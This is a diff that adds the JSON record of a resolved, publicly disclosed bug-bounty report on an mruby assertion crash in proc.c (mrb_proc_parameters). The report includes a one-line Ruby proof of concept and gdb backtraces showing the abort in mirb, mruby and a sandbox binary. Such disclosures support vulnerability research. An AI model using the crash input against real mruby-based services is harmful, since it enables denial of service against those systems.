@@ -1,0 +1,114 @@
+{
+  "id": 199764,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTk3NjQ=",
+  "url": "https://hackerone.com/reports/199764",
+  "title": "Aborted - proc.c - line:143",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2017-01-19T22:31:45.151Z",
+  "submitted_at": "2017-01-19T22:31:45.151Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ston3",
+    "url": "/ston3",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 15668,
+    "url": "https://hackerone.com/shopify-scripts",
+    "handle": "shopify-scripts",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "shopify-scripts",
+      "twitter_handle": "",
+      "website": "",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2017-03-09T01:24:48.039Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2017-02-07T01:24:44.120Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "PoC\n-------------------\n\nThe following code triggers the bug (attached as test_proc_143.rb):\n\n\tl([[]],Proc.new{|b,|}.parameters)\n\nmirb\n-------------------\n\n\tx@x:~/Desktop/test/mruby-engine/ext/mruby_engine/mruby/bin$ ./mirb test_proc_143 \n\tmirb - Embeddable Interactive Ruby Shell\n\n\tmirb: /home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-proc-ext/src/proc.c:143: mrb_proc_parameters: Assertion `i < (irep->nlocals-1)' failed.\n\tAborted (core dumped)\n\nmirb - Debug\n--------------------\n\n\t(gdb) r test_proc_143 \n\tStarting program: /home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/bin/mirb test_proc_143\n\tmirb - Embeddable Interactive Ruby Shell\n\n\tmirb: /home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-proc-ext/src/proc.c:143: mrb_proc_parameters: Assertion `i < (irep->nlocals-1)' failed.\n\n\tProgram received signal SIGABRT, Aborted.\n\t0x00007ffff7744f79 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56\n\t56\t../nptl/sysdeps/unix/sysv/linux/raise.c: No such file or directory.\n\t(gdb) bt\n\t#0  0x00007ffff7744f79 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56\n\t#1  0x00007ffff7748388 in __GI_abort () at abort.c:89\n\t#2  0x00007ffff773de36 in __assert_fail_base (fmt=0x7ffff788f718 \"%s%s%s:%u: %s%sAssertion `%s' failed.\\n%n\", assertion=assertion@entry=0x4b57c9 \"i < (irep->nlocals-1)\", \n\t\tfile=file@entry=0x4b5818 \"/home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-proc-ext/src/proc.c\", line=line@entry=143, function=function@entry=0x4b5880 <__PRETTY_FUNCTION__.4653> \"mrb_proc_parameters\")\n\t\tat assert.c:92\n\t#3  0x00007ffff773dee2 in __GI___assert_fail (assertion=assertion@entry=0x4b57c9 \"i < (irep->nlocals-1)\", file=file@entry=0x4b5818 \"/home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-proc-ext/src/proc.c\", \n\t\tline=line@entry=143, function=function@entry=0x4b5880 <__PRETTY_FUNCTION__.4653> \"mrb_proc_parameters\") at assert.c:101\n\t#4  0x000000000045b896 in mrb_proc_parameters (mrb=0x6ce010, self=...) at /home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-proc-ext/src/proc.c:143\n\t#5  0x0000000000408603 in mrb_vm_exec (mrb=mrb@entry=0x6ce010, proc=<optimized out>, proc@entry=0x6d5cc0, pc=0x72daa8) at /home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1174\n\t#6  0x000000000040eb9c in mrb_vm_run (mrb=mrb@entry=0x6ce010, proc=proc@entry=0x6d5cc0, self=..., stack_keep=stack_keep@entry=0) at /home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/src/vm.c:772\n\t#7  0x0000000000402e09 in main (argc=<optimized out>, argv=<optimized out>) at /home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549\n\nmruby\n--------------------\n\n\tx@x:~/Desktop/test/mruby-engine/ext/mruby_engine/mruby/bin$ ./mruby test_proc_143 \n\tmruby: /home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-proc-ext/src/proc.c:143: mrb_proc_parameters: Assertion `i < (irep->nlocals-1)' failed.\n\tAborted (core dumped)\n\nmruby - Debug\n--------------------\n\t\n\t(gdb) r test_proc_143 \n\tStarting program: /home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/bin/mruby test_proc_143\n\tmruby: /home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-proc-ext/src/proc.c:143: mrb_proc_parameters: Assertion `i < (irep->nlocals-1)' failed.\n\n\tProgram received signal SIGABRT, Aborted.\n\t0x00007ffff7744f79 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56\n\t56\t../nptl/sysdeps/unix/sysv/linux/raise.c: No such file or directory.\n\t(gdb) bt\n\t#0  0x00007ffff7744f79 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56\n\t#1  0x00007ffff7748388 in __GI_abort () at abort.c:89\n\t#2  0x00007ffff773de36 in __assert_fail_base (fmt=0x7ffff788f718 \"%s%s%s:%u: %s%sAssertion `%s' failed.\\n%n\", assertion=assertion@entry=0x4b4fc9 \"i < (irep->nlocals-1)\", \n\t\tfile=file@entry=0x4b5018 \"/home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-proc-ext/src/proc.c\", line=line@entry=143, function=function@entry=0x4b5080 <__PRETTY_FUNCTION__.4653> \"mrb_proc_parameters\")\n\t\tat assert.c:92\n\t#3  0x00007ffff773dee2 in __GI___assert_fail (assertion=assertion@entry=0x4b4fc9 \"i < (irep->nlocals-1)\", file=file@entry=0x4b5018 \"/home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-proc-ext/src/proc.c\", \n\t\tline=line@entry=143, function=function@entry=0x4b5080 <__PRETTY_FUNCTION__.4653> \"mrb_proc_parameters\") at assert.c:101\n\t#4  0x000000000045b0b6 in mrb_proc_parameters (mrb=0x6ce010, self=...) at /home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-proc-ext/src/proc.c:143\n\t#5  0x0000000000408a23 in mrb_vm_exec (mrb=mrb@entry=0x6ce010, proc=<optimized out>, proc@entry=0x6d5c90, pc=0x72daa8) at /home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1174\n\t#6  0x000000000040efbc in mrb_vm_run (mrb=mrb@entry=0x6ce010, proc=proc@entry=0x6d5c90, self=..., self@entry=..., stack_keep=0) at /home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/src/vm.c:772\n\t#7  0x000000000040f2b6 in mrb_top_run (mrb=mrb@entry=0x6ce010, proc=proc@entry=0x6d5c90, self=..., stack_keep=stack_keep@entry=0) at /home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/src/vm.c:2490\n\t#8  0x000000000043fa51 in mrb_load_exec (mrb=mrb@entry=0x6ce010, p=<optimized out>, c=c@entry=0x70b260) at /home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/parse.y:5755\n\t#9  0x000000000044161f in mrb_load_file_cxt (mrb=mrb@entry=0x6ce010, f=<optimized out>, c=c@entry=0x70b260) at /home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/parse.y:5764\n\t#10 0x00000000004026d3 in main (argc=<optimized out>, argv=0x7fffffffe018) at /home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232\n\nsandbox\n--------------------\n\n\tx@x:~/Desktop/test/mruby-engine/bin$ ./sandbox test_proc_143 \n\truby: /home/x/Desktop/test/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-proc-ext/src/proc.c:143: mrb_proc_parameters: Assertion `i < (irep->nlocals-1)' failed.\n\tAborted (core dumped)\n\nImpact\n--------------------\n\nIt can cause DoS.",
+  "weakness": {
+    "id": 48,
+    "name": "Uncontrolled Resource Consumption"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 153702,
+      "file_name": "test_proc_143.rb",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/153/702/452d29e3667cc144d65097918563653144c4722e/test_proc_143.rb?response-content-disposition=attachment%3B%20filename%3D%22test_proc_143.rb%22%3B%20filename%2A%3DUTF-8%27%27test_proc_143.rb&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4BD7AFDX%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T232501Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIG5Mzr0x%2F39caZ34VvnYZSu%2B4XVkYwA38IEB8ighJcTzAiEArtPm%2B8vaiCvHEmILAu%2BHyPF0pbWp%2BJPZNZdL%2F%2FlyMfcqsgUIHxADGgwwMTM2MTkyNzQ4NDkiDHvDZxI45WO%2FVcWRAyqPBWYJGhwuiVUh%2B0EvK00xvBEIwzRX34v%2BvZthshXDaUWH%2BuPRDBvIPmWGrSH8SD0g5H8HbEwkEfKzKDe5mjTk2awkWVbsSau8hngdZ7IhUGfDffI5lBmweljLTaxh%2BOoaq9Fs%2B8M5cec1GyvvCPKGDkFQeSrSIV6R6%2FDbCSm6i3N0K%2FamMzLzLLkT46OfbAyJP9LRvoa1w4L4sHNp6Yuj1H0KNyNE8TLfQBtH8Dc0ok4B0LKvxLlKMXC0JZJQkZr7HF5Dfn9mHEzR7vSqL18fUO2otCOQ4ERBiMMostU61Zi1UZJmu61vfApA7yhsBzxZ8rqKALxUu%2B1MFtosUYKkYrprYKEzKf9svpXjt%2FrXoBWbjoJkRXuvUZULV64AzqxfEABxHZnNlesMWsKnxcCi6hWoqM%2BMqFpwb%2ByEl%2BjvB7hb%2FpPlVfp%2FUX4hOMtJkN6uDdb1z%2FU9CnMaEdgawe6kTF9Vk%2FVgTwMGVloLq2yHI5vmd0tw8rxZ1I2ULlq%2FF5m8bqMCdif5rp2K7nBOhHTy9INO7J%2B85QgMsIeUZGt3cmPFFRP9kCG0gudhiCfx8O12qKSrP07TVQ%2FXxCbmeeGr1I2r6Bll3tkr8fENBu%2BKJScJy5O9OUl2aVyCndk7FgnFesONiq6cVO8TAz1Xf23OZJaPK%2FTzAFONQwscgKRFL9rZw1rwpoeahrbbC6mw7H7MqlQIM%2F9gmDx1ZWfVPTefT4FVKlpsrfYxrK5MtDBz7tQCiHCA7LfbXAjS%2FlWaAr2rdNKfndK7pdiCihvMKheo8M%2BOhQ27VwQdniEz2xssRvkOX4Wtfo340%2FLCmBv6SFEicozc4Jq4WyPoh3y1DkUJHxhOkdycejqPIVLn9IUshWgw1efBxgY6sQEHGWzuwlsd9fgperU6ktE%2BuXdh1rIZugRbxHX42QKa57gQF8EWQwEbtPI78E68kTrdP9nudx%2FAVHRecrssw0tXONvW6yuQBiE6gGix3Eq2%2BpFtSaKSngamNWxm0IF00P8zn4s2StsLeTzbZ3Nm86Dv4KQlzCnXGXly6KKUBCLHE3ZmKRfAwATv%2B7IcpN5amQZQu%2BTbMe1tmjRfvhIt%2BxuLa8WiyBlHqp5vns3XPmKRtA8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0d04845da0949d74e164b00075f895933cf0e9e90cd9fb5e113844d17b8f6ef2",
+      "file_size": 33,
+      "type": "text/plain",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2017-03-09T01:24:44.176Z",
+  "allow_singular_disclosure_after": -269474416.84111226,
+  "singular_disclosure_allowed": true,
+  "vote_count": 4,
+  "voters": [
+    "apapedulimu",
+    "eveeez",
+    "rbcafe",
+    "spetr0x"
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
